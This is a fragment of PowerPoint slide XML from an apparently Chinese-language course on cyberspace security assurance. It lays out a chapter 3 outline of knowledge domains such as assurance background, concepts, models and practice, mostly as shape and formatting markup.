          <p:cNvPr id="9" name="矩形 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1042988" y="1412875"/>
            <a:ext cx="1600118" cy="769441"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>第</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4400" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>章</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6619" y="840446"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>课程内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="575556" y="3448409"/>
            <a:ext cx="1785938" cy="556655"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="99CCFF">
                  <a:gamma/>
                  <a:tint val="27451"/>
                  <a:invGamma/>
                </a:srgbClr>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全保障基础</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="790836" y="5742127"/>
            <a:ext cx="1365250"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知识体</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3167844" y="5733256"/>
            <a:ext cx="1365250"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知识域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2485859" y="2421741"/>
            <a:ext cx="429957" cy="2622428"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 72540"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="36000" rIns="36000" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2981499" y="2177657"/>
            <a:ext cx="1710531" cy="495259"/>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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障背景</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3022251" y="3472374"/>
            <a:ext cx="1776266"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网络空间安全保障</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>概念与模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text Box 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795392" y="5706123"/>
            <a:ext cx="2160984"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知识子域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="100" name="Group 13"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5289406" y="1745857"/>
            <a:ext cx="3603074" cy="371103"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="101" name="Group 14"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="103" name="AutoShape 15"/>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04" name="AutoShape 16"/>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05" name="AutoShape 17"/>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06" name="AutoShape 18"/>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02" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="271"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>信息的性质</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="107" name="Group 20"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5272233" y="2240887"/>
            <a:ext cx="3607683" cy="371103"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="108" name="Group 21"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="110" name="AutoShape 22"/>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11" name="AutoShape 23"/>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12" name="AutoShape 24"/>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13" name="AutoShape 25"/>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09" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="271"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>信息与网络空间安全</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="114" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5314911" y="3320988"/>
            <a:ext cx="3577569" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="115" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="117"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18"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19"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20"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16"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网络空间安全保障</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="AutoShape 56"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4801333" y="1928935"/>
            <a:ext cx="418739" cy="1002634"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 77423"/>
              <a:gd name="adj2" fmla="val 51567"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4851173" y="3381193"/>
            <a:ext cx="368900" cy="781626"/>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a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="123" name="Group 58"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5287642" y="2729028"/>
            <a:ext cx="3604838" cy="411940"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="124" name="Group 59"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1481"/>
              <a:chExt cx="1363" cy="1802"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="126" name="AutoShape 60"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2272" y="1481"/>
                <a:ext cx="1363" cy="1802"/>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27" name="AutoShape 61"/>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28" name="AutoShape 62"/>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29" name="AutoShape 63"/>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dirty="0"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="125" name="Rectangle 64"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="224"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>信息技术与网络空间安全发展阶段</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2816566" y="2127708"/>
            <a:ext cx="27242" cy="3425528"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="131" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5294515" y="3861048"/>
            <a:ext cx="3597965" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="132" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="134"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35"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36"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37"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33"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网络空间安全保障相关模型</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3059832" y="4725884"/>
            <a:ext cx="1710531"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网络信息系统</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障概念与模型</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="139" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5292080" y="4492932"/>
            <a:ext cx="3577569" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="140" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="142"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43"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44"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45"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41"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网络信息系统安全保障</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4888753" y="4634703"/>
            <a:ext cx="331319" cy="781626"/>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a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="147" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5292080" y="5044168"/>
            <a:ext cx="3597965" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="148" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="15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51"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5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5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49"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网络信息系统安全保障模型</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5220072" y="1745857"/>
            <a:ext cx="0" cy="3807379"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="391648899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3513" y="707855"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>课程内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="575556" y="2756601"/>
            <a:ext cx="1785938" cy="556655"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="99CCFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="99CCFF">
                  <a:gamma/>
                  <a:tint val="27451"/>
                  <a:invGamma/>
                </a:srgbClr>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="3366FF"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="040404"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障实践</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="852534" y="5796207"/>
            <a:ext cx="1365250" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B01302"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识体</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3173634" y="5852537"/>
            <a:ext cx="1365250" cy="338554"/>
